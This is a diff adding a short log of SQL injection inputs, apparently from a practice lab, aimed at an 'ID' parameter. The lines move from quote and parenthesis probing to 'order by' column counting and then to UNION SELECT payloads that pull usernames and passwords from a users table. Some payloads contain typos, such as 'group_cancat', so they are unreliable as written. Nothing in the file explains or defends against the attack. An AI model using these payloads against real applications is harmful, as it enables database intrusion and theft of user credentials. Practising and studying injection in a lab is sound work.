@@ -1,0 +1,33 @@
+ID:1
+ID:2
+ID:2'
+ID:2"
+ID:2 order by 12--
+ID:2 order by 12-- 
+ID:2" order by 12-- 
+ID:2" order by 1-- 
+ID:2" order by 4-- 
+ID:2" order by 3-- 
+ID:2") order by 3-- 
+ID:2") order by 4-- 
+ID:2") order by 2-- 
+ID:2") order by 3-- 
+ID:2") union select 1,username,password from users-- 
+ID:2") union select 1 2,groupp_cancat(username,0x3a3a,password,'<br>') from users-- 
+ID:2") union select 1 2,group_cancat(username,0x3a3a,password,'<br>') from users-- 
+ID:2") union select 1 2,group_cancat(username,0x3a3a,password,'<br>') from users limit 1,0-- 
+ID:2") union select 1 2,group_cancat(username,0x3a3a,password,'<br>') from users limit 1,1-- 
+ID:2") union select 1 2,group_cancat(username,0x3a3a,password,'<br>') from users limit 0,1-- 
+ID:2") union select 1,2,group_cancat(username,0x3a3a,password,'<br>') from users limit 0,1-- 
+ID:2") union select 1,2,group_cancat(username,0x3a3a,password,'<br>') from users-- 
+ID:2") union select 1,username,password from users limit 0,1-- 
+ID:2") union select 1,username,password from users limit 1,1-- 
+ID:2") union select 1,username,password from users limit 0,1-- 
+ID:1") union select 1,username,password from users limit 0,1-- 
+ID:5") union select 1,username,password from users limit 0,1-- 
+ID:5") union select 1,username,password from users limit 1,1-- 
+ID:5") union select 1,username,password from users limit 2,1-- 
+ID:5'
+ID:5\
+ID:5'
+ID:5\
